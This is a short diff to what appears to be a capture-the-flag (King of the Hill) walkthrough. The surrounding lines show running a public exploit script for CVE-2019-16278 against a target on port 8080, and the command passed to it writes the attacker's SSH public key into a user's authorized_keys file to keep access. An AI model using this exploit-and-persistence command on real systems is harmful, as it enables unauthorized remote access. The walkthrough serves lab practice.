@@ -126,6 +126,7 @@ Requires: cve2019-16278.py(file in github), Hydra
 ```ssh-keygen```
 
 When generating the key, leave the passphrase empty.  This can be done beforehand.
+
 `cat <Your Key Name>.pub` (e.g. cat keygen.pub)
 
 ```python2 cve2019-16278.py <KOTH IP> 8080 "mkdir /home/gloria/.ssh; echo '<YOUR *.pub file data>' > /home/gloria/.ssh/authorized_keys"```
